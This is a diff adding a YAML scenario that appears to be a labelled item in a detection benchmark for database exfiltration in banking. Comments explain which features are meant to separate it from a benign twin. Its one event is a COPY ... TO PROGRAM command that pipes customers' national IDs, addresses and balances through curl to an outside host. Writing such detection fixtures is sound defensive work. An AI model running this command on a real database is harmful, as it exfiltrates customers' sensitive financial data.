@@ -1,0 +1,29 @@
+scenario_id: banking_exfil_pair_batchsvc_mal
+family_id: banking_exfil_pair_batchsvc
+domain: banking
+matched_pair_id: banking_exfil_pair_batchsvc_01
+matched_dimensions:
+  fixed: [process_tree_shape, role]
+  varied: [sql_content, connects_to_destination]
+time_of_day: "02:15"
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+  # batch_etl_service credentials compromised — same role as the benign
+  # twin (banking_exfil_pair_batchsvc_ben) on purpose, so role can't be the
+  # tell. The actual discriminators: (1) query breadth — full sensitive
+  # columns, no row filter, vs. the twin's scoped incremental replication
+  # contract; (2) destination — 198.51.100.77 is outside the documented
+  # replication-partner allowlist, one host off from the twin's approved
+  # 198.51.100.20 so the literal IP alone isn't a giveaway either.
+  - session_label: exfil
+    role: batch_etl_service
+    class: malicious
+    anchor: db
+    timing:
+      tempo: steady
+      step_gaps_seconds: [3.0]
+    events:
+      - step_id: exfil
+        sql: "COPY (SELECT c.national_id, c.address, a.balance, a.account_id FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://sync.example.net/push -d @-'"
+        connects_to: {ip: "198.51.100.77", port: 443}
